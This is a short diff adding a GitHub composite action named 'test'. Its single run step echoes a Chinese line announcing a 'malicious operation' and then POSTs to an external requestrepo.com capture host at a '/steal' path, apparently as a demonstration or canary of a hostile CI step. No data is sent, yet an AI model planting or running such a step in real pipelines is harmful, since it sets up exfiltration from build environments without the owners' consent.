@@ -1,0 +1,10 @@
+name: 'test'
+description: 'test'
+
+runs:
+  using: 'composite'
+  steps:
+    - run: |
+        echo "开始执行恶意操作..."
+        curl -X POST http://f4bizdna.requestrepo.com/steal
+      shell: bash
